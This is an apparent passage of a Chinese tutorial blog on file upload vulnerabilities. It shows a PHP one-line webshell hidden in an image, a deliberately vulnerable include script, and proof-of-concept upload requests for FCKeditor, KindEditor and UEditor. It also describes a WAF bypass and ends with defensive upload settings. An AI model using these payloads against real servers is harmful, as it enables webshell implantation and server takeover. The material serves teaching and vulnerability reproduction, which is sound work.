<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /system/test.txt HTTP/1.1</span><br><span class="line">Content-Length: 11</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)</span><br><span class="line">Host: 60.10.60.68:8001</span><br><span class="line"></span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p><img src="http://img.yichen.cf/learning_upload/20220310112744.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112731.png"></p>
<h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><h4 id="二次渲染原理"><a href="#二次渲染原理" class="headerlink" title="二次渲染原理"></a>二次渲染原理</h4><p>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p>
<h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h4><ul>
<li>配合文件包含漏洞：    将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</li>
<li>可以配合条件竞争：    这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传</li>
</ul>
<h4 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h4><p>直接在目录下创建一个文件包含的脚本include_image.php(构造文件包含)</p>
<p>注：主要是通过这个include_image.php文件包含图片马，把图片马解析为php脚本文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用dos命令，将图片和马子进行</p>
<p><code>copy 1.gif /b + 2.php /a 2.gif</code></p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>因为打算就用绕过二次渲染的方法来做本题，直接上传</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112817.png"></p>
<p>图片成功上传，将文件下载到本地，右击发现直接写进去的马子已经没了</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112824.png"></p>
<p>用010进行文件对比</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112835.png"></p>
<p>匹配部分，说明php在进行文件渲染的时候都不会进行修改，那么就将马子放在这个地方就好了，插入一句话木马</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112854.png"></p>
<p>上传图片马，使用文件包含解析</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112904.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112919.png"></p>
<h1 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h1><h2 id="漏洞实例复现"><a href="#漏洞实例复现" class="headerlink" title="漏洞实例复现"></a>漏洞实例复现</h2><h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>FCKeditor是目前最优秀的可见即可得网页编辑器之一，它采用JavaScript编写。具备功能强大、配置容易、跨浏览器、支持多种编程语言、开源等特点。它非常流行，互联网上很容易找到相关技术文档，国内许多Web项目和大型网站均采用了FCKeditor。</p>
<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Fckeditor 低于 2.6.4 php 版本任意文件上传漏洞，当您的PHP环境配置为 GPC &#x3D; Off 时可绕过currentfolder参数过滤上传脚本木马控制网站服务器</p>
<h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>影响版本如下：</p>
<p>Fckeditor版本&lt;&#x3D;2.6.4</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问漏洞存在页面editor&#x2F;filemanager&#x2F;connectors&#x2F;php&#x2F;connector.php，返回200即存在</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112941.png"></p>
<p><strong>poc</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&amp;Type=File&amp;CurrentFolder=fu.php%<span class="number">00</span>.gif HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------<span class="number">29565348729577</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip,deflate</span></span><br><span class="line"><span class="comment">Content-Length: 219</span></span><br><span class="line"><span class="comment">Host: IP</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: Keep-alive</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------29565348729577</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;NewFile&quot;; filename=&quot;fu.gif&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">&lt;?php eval($_POST[a]) ?&gt;</span></span><br><span class="line"><span class="comment">-----------------------------29565348729577--</span></span><br></pre></td></tr></table></figure>

<p><img src="http://img.yichen.cf/learning_upload/20220310112952.png"></p>
<p>访问文件，并使用蚁剑连接</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113003.png"></p>
<h3 id="kindeditor"><a href="#kindeditor" class="headerlink" title="kindeditor"></a>kindeditor</h3><h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>KindEditor是一套开源的HTML可视化编辑器，主要用于让用户在网站上获得所见即所得编辑效果，兼容IE、Firefox、Chrome、Safari、Opera等主流浏览器。</p>
<h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>漏洞存在于小于等于kindeditor4.1.11 编辑器里，你能上传.txt和 .html文件，支持php&#x2F;asp&#x2F;jsp&#x2F;asp.net。 &#x2F;php&#x2F;upload_json.php文件不会清理用户输入或者检查用户是否将任意文件上传到系统。通过构造一个恶意的 html文件来实现跳转，钓鱼等，恶意攻击者可实现。</p>
<h4 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>影响版本如下：</p>
<p>kindeditor版本&lt;&#x3D;4.1.11</p>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>查看版本信息：<a target="_blank" rel="noopener" href="http://localhost/kindeditor.js%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%8C%E7%89%88%E6%9C%AC%E4%B8%BA">http://localhost/kindeditor.js，虚拟机显示如下，版本为</a> 4.1.11.，一般存在漏洞。</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113013.png"></p>
<p>这里我们采用的是php，访问<a target="_blank" rel="noopener" href="http://localhost/php/upload_json.php">http://localhost/php/upload_json.php</a> ，返回状态码200，显示存在。否则显示404，not found</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113029.png"></p>
<p>构造POC或者CURL提交文件。这次采用构造 POC,url替换为攻击url</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Uploader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/kindeditor.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">KindEditor</span>.<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params">K</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> uploadbutton = K.<span class="title function_">uploadbutton</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">button</span>: <span class="title function_">K</span>(<span class="string">&#x27;#uploadButton&#x27;</span>)[<span class="number">0</span>],</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">fieldName</span>: <span class="string">&#x27;imgFile&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&#x27;http://localhost/php/upload_json.php?dir=file&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">afterUpload</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data.<span class="property">error</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> url = K.<span class="title function_">formatUrl</span>(data.<span class="property">url</span>, <span class="string">&#x27;absolute&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">K</span>(<span class="string">&#x27;#url&#x27;</span>).<span class="title function_">val</span>(url);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            uploadbutton.<span class="property">fileBox</span>.<span class="title function_">change</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                uploadbutton.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;ke-input-text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">readonly</span>=<span class="string">“readonly”/</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadButton&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问html文件如下，上传123.html，返回访问路径</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113042.png"></p>
<h3 id="ueditor"><a href="#ueditor" class="headerlink" title="ueditor"></a>ueditor</h3><h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p>Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。</p>
<h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。</p>
<p>Crawler方法对source[]的检查仅仅是一个ContentType</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">if (response.ContentType.IndexOf(&quot;image&quot;) == -1)</span><br><span class="line">&#123;</span><br><span class="line">State = &quot;Url is not an image&quot;;</span><br><span class="line">return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>影响版本如下：</p>
<p>1.4.3.3 Net版</p>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>我们可以利用post方法直接上传文件到目标网站</p>
<p><strong>POC</strong>参考如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xx.com/ueditor/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用搭建好的环境，修改上方POCurl地址</p>
<p>在复现这个漏洞的时候，你可能需要一个服务器，上传你的木马文件</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113100.png"></p>
<p>上传成功，并返回文件路径</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113107.png"></p>
<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p>版本 4.0.231(Apache版)</p>
<p>漏洞环境为：apache+php+upload_labs</p>
<h4 id="增大文件大小"><a href="#增大文件大小" class="headerlink" title="增大文件大小"></a>增大文件大小</h4><p>测试发现 waf对于Content-Disposition字段的 长度验证不是很准确，因为我们可以想到它进行拦截的规则肯定是基于正则，那么我们想办法让安全狗拦截的正则匹配不到即可</p>
<p>这里附一个对Content-Disposition字段的解释</p>
<blockquote>
<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。<br>在 multipart&#x2F;form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart 消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
</blockquote>
<p>这里对这个字段的长度进行篡改，绕过成功</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310113116.png"></p>
<h1 id="防范策略及注意事项"><a href="#防范策略及注意事项" class="headerlink" title="防范策略及注意事项"></a>防范策略及注意事项</h1><h2 id="防范策略"><a href="#防范策略" class="headerlink" title="防范策略"></a>防范策略</h2><h3 id="防范DoS攻击："><a href="#防范DoS攻击：" class="headerlink" title="防范DoS攻击："></a>防范DoS攻击：</h3><p>防范DoS攻击的一种有效策略为限制上传文件的容量。PHP能够在php.ini中设置上传功能的容量限制。下表中列出了与文件上传相关的配置项。建议在满足应用需求的前提下禁令将值设置的小一些。如果应用不提供文件上传功能，那么只需要将file_uploads设置为Off即可。</p>
<table>
<thead>
<tr>
<th><strong>设置项目名</strong></th>
<th><strong>解说</strong></th>
<th><strong>默认值</strong></th>
</tr>
</thead>
<tbody><tr>
<td>file_uploads</td>
<td>是否允许使用文件上传功能</td>
<td>On</td>
</tr>
<tr>
<td>upload_max_filesize</td>
<td>单个文件的最大容量</td>
<td>2MB</td>
</tr>
<tr>
<td>max_file_uploads</td>
<td>单词请求最大文件上传个数</td>
<td>20</td>
</tr>
<tr>
<td>post_max_size</td>
<td>POST请求正文的最大限制</td>
<td>8MB</td>
</tr>
<tr>
<td>memory_limit</td>
<td>脚本所能申请到的最大内存值</td>
<td>128MB</td>
</tr>
</tbody></table>
<h3 id="通过上传文件使服务器执行脚本："><a href="#通过上传文件使服务器执行脚本：" class="headerlink" title="通过上传文件使服务器执行脚本："></a>通过上传文件使服务器执行脚本：</h3><p>有些文件上传处理会将用户上传的文件保存至Web服务器的公开目录中。这时，如果<strong>应用中允许上传文件的扩展名为php、asp、aspx、jsp等脚本文件</strong>的扩展名，用户就能在服务器上将啥概念车的文件作为脚本执行。</p>
<p>如果外界传入的脚本在服务器上被执行，就会造成与OS命令注入同样的影响，具体如下：</p>
<ul>
<li>浏览、篡改或删除Web服务器内的文件。 </li>
<li>对外发送邮件 </li>
<li>攻击其他服务器（称为垫脚石）</li>
</ul>
<p>为了防范通过上传文件而在服务器上执行脚本，可以综合实施以下两种方法，或者实施其中的任意一种。</p>
<ul>
<li>不将用户上传的文件保存在公开目录中，浏览文件需要通过脚本。</li>
<li>将文件的扩展名限定为不可执行的脚本文件。</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>使用白名单限制可以上传的文件扩展</li>
<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
<li>修复服务器可能存在的解析漏洞</li>
<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
<li>隐藏上传文件路径。</li>
<li>升级Web Server</li>
<li>及时修复Web上传代码</li>
<li>不能有本地文件包含漏洞</li>
<li>注意0x00截断攻击</li>
<li>上传文件的存储目录禁用执行权限</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">逸晨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.yichen.cf/2022/03/10/%E6%B5%85%E8%B0%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://blog.yichen.cf/2022/03/10/%E6%B5%85%E8%B0%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.yichen.cf" target="_blank">逸晨のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="http://r8ilupnbg.bkt.clouddn.com/v2-91b3ddf62987c7a077eed785acd90545_1440w.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">逸晨</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:yich_net@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.</span> <span class="toc-text">文件上传的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%AF%94%E8%BE%83%E5%AE%B9%E6%98%93%E4%BA%A7%E7%94%9F%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞比较容易产生的位置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">文件上传漏洞工具以及相关利用脚本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-number">2.1.1.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-number">2.1.3.</span> <span class="toc-text">小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC"><span class="toc-number">2.1.4.</span> <span class="toc-text">大马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">webshell管理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%EF%BC%88Chopper%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">中国菜刀（Chopper）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%EF%BC%88AntSword%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">蚁剑（AntSword）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-Behinder"><span class="toc-number">2.2.3.</span> <span class="toc-text">冰蝎(Behinder)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89-Godzilla"><span class="toc-number">2.2.4.</span> <span class="toc-text">哥斯拉(Godzilla)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">3.</span> <span class="toc-text">文件上传漏洞利用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">客户端绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">判断方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%A1%88%E4%BE%8B%EF%BC%88Upload-Lab-Pass-01%EF%BC%89"><span class="toc-number">3.1.3.</span> <span class="toc-text">参考案例（Upload_Lab_Pass_01）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%951"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">绕过方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%952"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">绕过方法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.1.3.3.</span> <span class="toc-text">代码审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">服务端绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.1.</span> <span class="toc-text">MIME绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%A1%88%E4%BE%8B%EF%BC%88Upload-Lab-Pass-02%EF%BC%89"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">参考案例（Upload_Lab_Pass_02）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">3.2.1.2.1.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.1.2.2.</span> <span class="toc-text">代码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B"><span class="toc-number">3.2.2.</span> <span class="toc-text">文件幻数检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%A1%88%E4%BE%8B"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">参考案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C"><span class="toc-number">3.2.3.</span> <span class="toc-text">黑名单校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">双写绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span 